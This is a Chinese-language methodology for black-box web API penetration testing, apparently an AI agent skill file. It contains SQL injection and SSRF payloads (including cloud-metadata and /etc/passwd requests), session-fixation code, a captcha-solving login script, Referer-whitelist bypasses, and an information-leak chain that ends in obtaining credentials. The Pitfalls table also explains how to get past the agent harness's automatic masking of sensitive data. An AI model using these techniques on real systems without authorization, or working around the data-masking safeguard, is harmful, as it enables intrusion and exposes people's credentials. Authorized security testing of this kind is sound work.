# Web API 黑盒漏洞测试方法论

实战总结的 PHP/Web API 黑盒安全测试流程。适用于没有源码、只有 URL 的场景。

## Phase 1: 攻击面发现

### 1.1 前端源码提取 API 端点

```bash
# 从 HTML/JS 中提取所有 API 路径
curl -sL https://target/ | grep -oE '/api/[a-z_]+\.php' | sort -u
# 结果示例: /api/redeem_card.php, /api/check_account.php, ...
```

### 1.2 API 目录批量探测

```bash
# 已知 API 目录下批量探测隐藏端点
for ep in admin config test debug info backup export data list stats \
           dashboard manage login users accounts orders cards logs; do
  code=$(curl -sL --max-time 5 -o /dev/null -w "%{http_code}" "https://target/api/${ep}.php")
  [ "$code" != "404" ] && echo "${ep}.php: $code"
done
```

### 1.3 根路径常见文件探测

```bash
for path in admin admin.php login .env .git/config robots.txt \
            phpinfo.php test.php config.php; do
  code=$(curl -sL --max-time 5 -o /dev/null -w "%{http_code}" "https://target/$path")
  [ "$code" != "404" ] && echo "$path: $code"
done
```

### 1.4 HTTP 响应头分析

```bash
curl -sI https://target/api/endpoint.php | grep -iE \
  "server:|x-powered|set-cookie|x-frame|content-security|access-control|strict-transport"
```

关键判断：
- `Access-Control-Allow-Origin: *` → CORS 全开放，任何网站可跨域调用
- `Server: ESA` → 阿里云 WAF
- `acw_tc` cookie → 阿里云 WAF token
- 无 CSP/X-Frame-Options → 可被 iframe 嵌入

## Phase 2: 漏洞测试

### 2.1 信息泄露测试

**核心思路**：每个 API 响应都检查是否返回了超出预期的数据。

```python
# 测试过期/无效资源是否泄露关联实体
resp = post("/api/redeem_card.php", {"card_code": "EXPIRED_CARD"})
# 检查响应中的 last_account, last_user, last_order 等字段

# 测试查询接口是否泄露绑定凭证
resp = get("/api/check_account.php?account=KNOWN_USER")
# 检查 detail.occupation.card_code, detail.rental 等字段
```

**信息泄露链模式**：
```
过期资源 API → 泄露关联实体 ID
关联实体查询 API → 泄露当前绑定的凭证
凭证使用 API → 获取完整访问权限
```

### 2.2 SQL 注入测试

```python
# 布尔盲注
r1 = get("/api/check?account=KNOWN_USER")           # 正常
r2 = get("/api/check?account=KNOWN_USER' AND '1'='1") # 真
r3 = get("/api/check?account=KNOWN_USER' AND '1'='2") # 假
if r2 != r3: print("可能存在SQL注入")

# UNION 注入
get("/api/check?account=test' UNION SELECT 1,2,3,4,5--")

# 参数化查询检测
# 如果注入 payload 被当作普通字符串返回（原样反射），说明参数化了
```

### 2.3 SSRF 测试

逐个参数注入内网地址：

```python
ssrf_payloads = [
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:8080",
    "file:///etc/passwd",
]

for param in ["account", "card_code", "url", "callback", "notify_url"]:
    for payload in ssrf_payloads:
        resp = post(f"/api/endpoint.php", {param: payload})
        # 检查响应是否包含内网数据
```

### 2.4 Session Fixation 测试

```python
s = requests.Session()
# 1. 设置攻击者控制的 session ID
s.cookies.set('PHPSESSID', 'attacker_controlled_id', domain='target.com')
# 2. 访问登录页
s.get('https://target.com/admin/')
# 3. 提交登录
s.post('https://target.com/admin/', data={'username':'x','password':'y','captcha':'z'})
# 4. 验证 session 是否保持
if s.cookies.get('PHPSESSID') == 'attacker_controlled_id':
    print("Session Fixation 确认")
```

### 2.5 认证绕过测试

```python
# 测试无认证接口
for endpoint in ["/api/add_friend.php", "/api/export.php", "/api/admin.php"]:
    resp = post(endpoint, {"test": "data"})
    if resp.status_code != 401 and resp.status_code != 403:
        print(f"[!] {endpoint} 无需认证")

# 测试隐藏参数
for param in ["debug", "admin", "token", "key", "action", "cmd"]:
    resp = post("/api/endpoint.php", {"card_code": "test", param: "1"})
    if "正常错误信息" not in resp.text:
        print(f"[!] 参数 {param} 有特殊响应")
```

### 2.6 数学验证码自动爆破

```python
import re, requests

def parse_captcha(html):
    """解析数学验证码: '验证：17 + 3 = ?' → 20"""
    m = re.search(r'验证：(\d+)\s*([+\-×÷*])\s*(\d+)\s*=\s*\?', html)
    if not m: return None
    a, op, b = int(m.group(1)), m.group(2), int(m.group(3))
    ops = {'+': lambda: a+b, '-': lambda: a-b, '*': lambda: a*b}
    return ops.get(op, lambda: a//b)()

s = requests.Session()
r = s.get('https://target/admin/')
captcha = parse_captcha(r.text)
r = s.post('https://target/admin/', data={
    'username': 'admin', 'password': 'test', 'captcha': str(captcha)
})
```

### 2.7 CORS 配置测试

```bash
# 检查是否允许任意 origin
curl -sI -H "Origin: https://evil.com" https://target/api/endpoint.php \
  | grep -i "access-control-allow-origin"
# 如果返回 "Access-Control-Allow-Origin: https://evil.com" → 反射型 CORS
# 如果返回 "Access-Control-Allow-Origin: *" → 全开放 CORS
```

### 2.8 FOFA Icon Hash

```python
import base64, hashlib, requests
for path in ["/favicon.ico", "/favicon.svg", "/qinzi.png"]:
    r = requests.get(f"https://target{path}")
    if r.status_code == 200:
        h = hashlib.md5(base64.b64encode(r.content)).hexdigest()
        print(f"{path}: icon_md5=\"{h}\"")
```

## Phase 3: 利用脚本模式

### 交互式脚本模板

用户偏好交互式脚本（菜单驱动），而非命令行参数：

```python
def banner():
    print("╔═══════════════════════════╗")
    print("║   ⚡ 工具名称 ⚡          ║")
    print("╚═══════════════════════════╝")

def menu():
    print("[1] 功能1")
    print("[2] 功能2")
    print("[0] 退出")

def main():
    banner()
    while True:
        menu()
        choice = input(">>> ").strip()
        if choice == "0": break
        # ... 功能实现
```

## Pitfalls

| 问题 | 原因 | 解决 |
|------|------|------|
| API 返回 406 "请求头参数Referer不能为空" | 华为/营销页 API 校验 Referer 来源 | 加 `-H 'Referer: PAGE_URL'` 或 `curl -e PAGE_URL` |
| Referer 域名校验可绕过 | 部分 API 只检查 Referer 是否存在/非空，或域名白名单含 IP 地址 | 尝试 `-H 'Referer: http://127.0.0.1/'`（IP 地址常绕过域名白名单）、`-H 'Referer: null'`、`-H 'Referer: test'` |
| API 返回 `data[0]` + `data[1]` 双值 | 双值接口：`[0]`=最新（动画终点），`[1]`=次新（动画起点） | 常见于"实时计数器"页面，前端用两个值做数字滚动动画 |
| 终端输出显示 `***` 脱敏 | Hermes 自动脱敏敏感数据 | 用 `curl -o file` 保存原始响应再 `read_file` |

## 前端 JS → API 端点提取

当需要从页面 JS 中发现隐藏 API 时，参考 `references/frontend-js-reverse.md` 的完整工作流。

### 关键实践

- **顺序执行**：一个请求完成后再发下一个，避免触发限频
- **requests.Session()**：保持 cookie/session 一致性
- **trust_env=False**：跳过系统代理
- **timeout=15**：防止单个请求卡死整个流程
- **彩色输出**：用 ANSI 转义码增强可读性
- **结果保存**：JSON 格式保存，便于后续分析
